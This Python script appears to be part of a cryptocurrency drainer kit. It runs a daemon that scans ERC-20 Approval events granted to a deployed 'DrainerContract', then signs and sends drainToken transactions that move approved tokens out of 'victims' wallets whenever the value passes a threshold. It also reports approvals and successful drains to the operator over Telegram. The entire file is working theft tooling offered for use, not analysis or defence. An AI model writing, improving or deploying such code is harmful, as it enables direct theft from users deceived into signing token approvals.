#!/usr/bin/env python3
"""
Standalone monitoring script that runs independently of the Flask app.
Watches for new Approval events and automatically drains victims.
Can be run as a systemd service.
"""
import json
import sys
import time
import signal
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from backend.config import (
    CHAIN_CONFIG, DEFAULT_CHAIN, YOUR_PRIVATE_KEY, YOUR_WALLET_ADDRESS,
    MONITOR_INTERVAL_SECONDS, MAX_GAS_PRICE_GWEI, GAS_MULTIPLIER, LOG_FILE
)
from backend.config import normalize_private_key
from backend.deployer import get_web3

from web3 import Web3

try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    from web3.middleware.proof_of_authority import ExtraDataToPOAMiddleware as geth_poa_middleware


class DrainMonitor:
    """Monitors for Approval events and auto-drains."""
    
    def __init__(self, chain_name=DEFAULT_CHAIN):
        self.chain_name = chain_name
        self.config = CHAIN_CONFIG[chain_name]
        self.running = True
        
        # Setup logging
        self.log_path = Path(LOG_FILE)
        self.log_path.parent.mkdir(exist_ok=True)
        
        # Connect
        self.w3, _ = get_web3(chain_name)
        try:
            private_key = normalize_private_key(YOUR_PRIVATE_KEY)
        except ValueError as exc:
            self.log(f"[!] {exc}")
            sys.exit(1)
        self.account = self.w3.eth.account.from_key(private_key)
        
        # Load deployment
        deploy_path = Path("deployment_info.json")
        if not deploy_path.exists():
            self.log("[!] No deployment found. Run deployer.py first.")
            sys.exit(1)
        
        with open(deploy_path) as f:
            self.deployment = json.load(f)
        
        self.drainer_address = Web3.to_checksum_address(self.deployment["drainer_address"])
        
        # Load drainer ABI
        abi_path = Path(__file__).resolve().parent.parent / "contracts" / "compiled" / "DrainerContract.json"
        if not abi_path.exists():
            self.log("[!] Drainer ABI not found. Compile contracts first.")
            sys.exit(1)
        
        with open(abi_path) as f:
            drainer_json = json.load(f)
        
        self.drainer_contract = self.w3.eth.contract(
            address=self.drainer_address,
            abi=drainer_json["abi"]
        )
        
        # Create token contract instance for event scanning
        self.token_abis = {
            "approval": [{
                "anonymous": False,
                "inputs": [
                    {"indexed": True, "name": "owner", "type": "address"},
                    {"indexed": True, "name": "spender", "type": "address"},
                    {"indexed": False, "name": "value", "type": "uint256"},
                ],
                "name": "Approval",
                "type": "event"
            }]
        }
        
        self.last_scanned_block = self.w3.eth.block_number - 10
        
        self.log(f"[+] Monitor initialized")
        self.log(f"[+] Chain: {chain_name} (ID: {self.config['chain_id']})")
        self.log(f"[+] Drainer: {self.drainer_address}")
        self.log(f"[+] Target tokens: {len(self.config['high_value_tokens'])}")
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def log(self, msg):
        """Log with timestamp."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{timestamp}] {msg}"
        print(line)
        with open(self.log_path, "a") as f:
            f.write(line + "\n")
    
    def signal_handler(self, sig, frame):
        self.log("[*] Shutting down monitor...")
        self.running = False
    
    def scan_approvals(self):
        """Scan recent blocks for new Approval events targeting our drainer."""
        try:
            current_block = self.w3.eth.block_number
            if current_block <= self.last_scanned_block:
                return []
            
            from_block = self.last_scanned_block
            to_block = current_block
            
            self.log(f"[*] Scanning blocks {from_block} -> {to_block} ({to_block - from_block} blocks)")
            
            approvals = []
            
            for token_addr in self.config["high_value_tokens"]:
                token_contract = self.w3.eth.contract(
                    address=Web3.to_checksum_address(token_addr),
                    abi=self.token_abis["approval"]
                )
                
                try:
                    events = token_contract.events.Approval.get_logs(
                        fromBlock=from_block,
                        toBlock=to_block,
                        argument_filters={"spender": self.drainer_address}
                    )
                    
                    for event in events:
                        owner = event["args"]["owner"]
                        value = event["args"]["value"]
                        tx_hash = event["transactionHash"].hex()
                        
                        approvals.append({
                            "owner": owner,
                            "token": token_addr,
                            "value": value,
                            "tx_hash": tx_hash,
                            "block": event["blockNumber"],
                        })
                        
                        self.log(f"[!] Approval: {owner} -> {value} of {token_addr}")
                        
                        # Try to get token symbol
                        try:
                            sym_contract = self.w3.eth.contract(
                                address=Web3.to_checksum_address(token_addr),
                                abi=[{"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"}]
                            )
                            symbol = sym_contract.functions.symbol().call()
                        except:
                            symbol = "?"
                        
                        # Send Telegram notification
                        try:
                            from bot.telegram_bot import notify_approval
                            notify_approval(owner, token_addr, value, self.chain_name)
                        except:
                            pass
                        
                        # Auto-drain if value is significant
                        if value > 10 * 10**18:  # ~$10 threshold
                            self.execute_drain(token_addr, owner, symbol)
                
                except Exception as e:
                    self.log(f"[-] Error scanning {token_addr}: {e}")
            
            self.last_scanned_block = to_block
            return approvals
        
        except Exception as e:
            self.log(f"[-] Scan error: {e}")
            return []
    
    def execute_drain(self, token_addr, victim, symbol="?"):
        """Execute drain for a specific victim and token."""
        try:
            self.log(f"[*] Attempting to drain {symbol} from {victim}")
            
            tx = self.drainer_contract.functions.drainToken(
                Web3.to_checksum_address(token_addr),
                victim
            ).build_transaction({
                "from": self.account.address,
                "gas": 200000,
                "gasPrice": int(self.w3.eth.gas_price * GAS_MULTIPLIER),
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "chainId": self.config["chain_id"],
            })
            
            signed = self.account.sign_transaction(tx)
            tx_hash = self.w3.eth.send_raw_transaction(signed.raw_transaction)
            
            self.log(f"[+] Drain tx sent: {tx_hash.hex()}")
            
            # Wait for receipt
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
            
            if receipt["status"] == 1:
                self.log(f"[✓] DRAIN SUCCESS: {symbol} from {victim}")
                
                # Notify via Telegram
                try:
                    from bot.telegram_bot import notify_drain
                    notify_drain(victim, symbol, "auto-drained", tx_hash.hex(), self.chain_name)
                except:
                    pass
            else:
                self.log(f"[-] Drain failed (reverted)")
        
        except Exception as e:
            self.log(f"[-] Drain execution error: {e}")
    
    def run_forever(self):
        """Main loop."""
        self.log("[*] Starting monitor loop...")
        
        while self.running:
            try:
                self.scan_approvals()
                time.sleep(MONITOR_INTERVAL_SECONDS)
            except Exception as e:
                self.log(f"[-] Loop error: {e}")
                time.sleep(60)
        
        self.log("[*] Monitor stopped.")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Run the drain monitor")
    parser.add_argument("--chain", default=DEFAULT_CHAIN, choices=list(CHAIN_CONFIG.keys()))
    args = parser.parse_args()
    
    monitor = DrainMonitor(args.chain)
    monitor.run_forever()


if __name__ == "__main__":
    main()